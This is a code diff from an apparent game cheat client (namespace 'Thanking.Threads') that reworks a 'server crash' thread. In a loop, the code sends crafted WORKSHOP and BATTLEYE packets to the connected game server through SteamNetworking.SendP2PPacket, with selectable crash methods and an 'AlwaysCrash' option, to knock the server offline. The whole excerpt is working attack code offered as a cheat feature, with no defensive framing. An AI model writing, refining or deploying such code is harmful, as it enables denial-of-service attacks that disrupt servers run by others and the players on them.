@@ -28,26 +28,20 @@ namespace Thanking.Threads
                 OV_Provider.IsConnected = false;
             };
 
-            byte[] P1 = {(byte) ESteamPacket.WORKSHOP, 69, 69};
-            byte[] P2 = {(byte) ESteamPacket.BATTLEYE, 69, 69};
-
-            int S1 = P1.Length;
-            int S2 = P2.Length;
+            byte[] P1 = { (byte) ESteamPacket.WORKSHOP, 0, 0 };
+            byte[] P2 = { (byte) ESteamPacket.BATTLEYE, 0, 0 };
             
             while (true)
             {
-                if (AlwaysCrash && OV_Provider.IsConnected)
-                    ServerCrashEnabled = true;
-
-                if (ServerCrashEnabled)
+                if (OV_Provider.IsConnected && (ServerCrashEnabled || AlwaysCrash))
                 {
                     switch (MiscOptions.SCrashMethod)
                     {
                         case 1:
-                            Provider.send(Provider.server, ESteamPacket.WORKSHOP, P1, S1, 0);
+                            SteamNetworking.SendP2PPacket(Provider.server, P1, 3, EP2PSend.k_EP2PSendUnreliableNoDelay, 0);
                             break;
                         case 2:
-                            Provider.send(Provider.server, ESteamPacket.BATTLEYE, P2, S2, 0);
+                            SteamNetworking.SendP2PPacket(Provider.server, P2, 3, EP2PSend.k_EP2PSendUnreliableNoDelay, 0);
                             break;
                     }
                 }
